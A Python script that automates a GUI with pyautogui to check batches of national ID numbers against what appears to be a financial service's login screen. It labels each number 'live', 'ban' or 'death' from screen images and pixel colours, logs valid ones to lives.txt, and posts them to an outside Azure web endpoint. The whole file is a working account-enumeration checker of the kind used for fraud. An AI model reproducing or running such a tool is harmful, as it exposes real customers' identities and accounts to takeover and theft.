import pyautogui as p
import time
#import os
from PIL import Image
#from pytesseract import pytesseract
from printy import printy
import json
import requests
import threading


DEATH_1 = "./imagenes/death_1.png"  #Tarjeta
DEATH_2 = "./imagenes/death_2.png"  #Afiliacion
VALIDAR_1 = "./imagenes/validar_1.png"  #Aceptar
VALIDAR_2 = './imagenes/validar_2.png'  #Bloqueado
BAN = './imagenes/ban.png'  #BAN BAN
LIVE = './imagenes/live.png' #Live

IngresarNumDocumento =  890,386
IngresarNumDocumentoMedio = 771,390

def borrar():
    for _ in range(10):
        p.press('backspace')

def verificarBAN(BAN,bansito):
    bansito = p.locateOnScreen(BAN, grayscale=True, confidence=0.9, region=(684,312,1249,736)) #codenadas del BAN BAN
    #print(f"bansito: {bansito}")
    if bansito!=None:
        #input("BAN TEST POR ESO PARADO")
        time.sleep(0.2)
        p.click(1122,585) # click en aceptar
        time.sleep(0.3)
        return True

def agregarUsuarioA_la_DB(dni,status,proceso):
    try:
        api_url = 'https://jackelinos.azurewebsites.net/agregar_usuario'
        # Los datos que quieres enviar en formato JSON
        #proceso = int(proceso)

        data = {
            "DNI": dni,
            "Status": status,
            "Procesado": proceso
        }

        json_data = json.dumps(data)
        headers = {'Content-Type': 'application/json'}
        resultado = requests.post(api_url, data=json_data,headers=headers)

        #print("Status Code:", resultado.status_code)
        #print("Response Content:", resultado.content)

        if resultado.status_code == 201:
            response = resultado.json()
            print(response)
            
        else:
            print("Error en la solicitud a la API.")
            return None
    except Exception as e:
        print("Error durante la solicitud a la API:", str(e))
        return None
    

def procesar_lote():
    linealote = 0
    with open('./dni.txt', 'r') as f:
        lines = f.readlines()

    for line in lines:
        linealote += 1
        valor1 = line.strip()
        #print(f"Testeando {linealote}: {valor1}")
        
        time.sleep(0.4)
        p.doubleClick(IngresarNumDocumentoMedio) # para ingresar el numero del documento
        time.sleep(0.1) # esperar un rato para que no se bugee
        p.typewrite(valor1, interval=0.025)
        time.sleep(0.2) 

        #Hacer un bucle para que le de en continuar si o si luego
        p.click(944,516)    #Click en continuar
        
        #Verificar 
        rojo =  False
        d1 = None
        v1= None
        v2 = None
        live = None
        bansito = None

        time.sleep(0.5)
        
        while True:
            time.sleep(0.1)
            
            #Verificar si es BAN
            if verificarBAN(BAN,bansito):
                printy(f"N. {linealote} : {valor1.rstrip()} -------------> [c]BAN BAN BAN")
                banDNI = open("ban.txt","a")
                banDNI.write(valor1.rstrip()) # escribir en el block
                banDNI.write("\n")
                banDNI.close()
                break
            
            #Acceso contrasena
            rojo = p.pixelMatchesColor(774,250,(236,17,26))
            #print(f"rojo: {rojo}")
            if rojo is True:      # Deja poner la contrasena 
                #Si aparece el rojo es por que es live
                time.sleep(0.2)
                p.press('esc') # para salir al menu principal
                time.sleep(0.3)

                printy(f"N. {linealote} : {valor1.rstrip()} -------------> [n]DNI VALIDO@")
                
                hilo3 = threading.Thread(target=agregarUsuarioA_la_DB, args=(valor1,"", "2" ))
                hilo3.start()
                
                livesDNI = open("lives.txt","a")
                livesDNI.write(valor1.rstrip()) # escribir en el block
                livesDNI.write("\n")
                livesDNI.close()

                break


            #DEATH 1 > > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )
            d1 = p.locateOnScreen(DEATH_1, grayscale=True, region=(683,48,1233,120))
            #print(f"d1: {d1}")
            if d1!=None:
                #print("INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )")
                #print(f'N° {linealote} : DEATH > > > {valor1} > > INFORMACION DE LA TARJETA ( PIDE REGISTRAR LA TARJETA )')
                printy(f"N. {linealote} : {valor1.rstrip()} -------------> [rI]TARJETA")
                time.sleep(0.1)
                p.click(712,107) # click en para atras para retroceder
                time.sleep(0.3)
                break
            
            # DEATH 2 > > > No tienes cuenta con nosotros
            d2 = p.locateOnScreen(DEATH_2, grayscale=True, region=(685,502,1242,740)) #grande imagen
            #print(f"d1: {d1}")
            if d2!=None:
                #print(f'N° {linealote} :  DEATH > > > {valor1} > > > No tienes cuenta con nosotros')
                printy(f"N. {linealote} : {valor1.rstrip()} -------------> [rI]TARJETA")
                #print("No tienes cuenta con nosotros")
                time.sleep(0.1)
                p.click(988,613) # Click en ahora NO para retroceder
                time.sleep(0.3)
                break
        registro = open("registro.txt","w")
        registro.write(valor1.rstrip()) # escribir en el block
        registro.write("\n")
        registro.close()
    

if __name__ == "__main__":
    
    
    printy("Presione 'Enter' para continuar","c")
    input()

    time.sleep(1)
    procesar_lote()
    
    #agregarUsuarioA_la_DB("99999995","testo","99")
    #borrarDocumento()